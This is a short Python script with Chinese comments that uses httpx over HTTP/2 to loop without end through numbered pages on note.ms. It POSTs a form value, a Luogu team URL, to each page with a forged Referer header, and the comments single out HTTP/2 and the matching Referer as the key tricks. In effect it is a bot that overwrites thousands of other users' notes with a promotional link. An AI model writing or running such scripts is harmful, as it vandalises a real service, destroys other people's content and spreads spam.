import httpx
client=httpx.Client(http2=True) #重点：要用HTTP2
website="https://note.ms/"
i=1
while True:
    while i<10000:
        form={"t":"https://www.luogu.com.cn/team/54817"}
        header={"Referer":website+str(i)} #另一个重点：一样的Referer
        client.post(website+str(i),data=form,headers=header)
        print(i)
        i=i+2
    i=0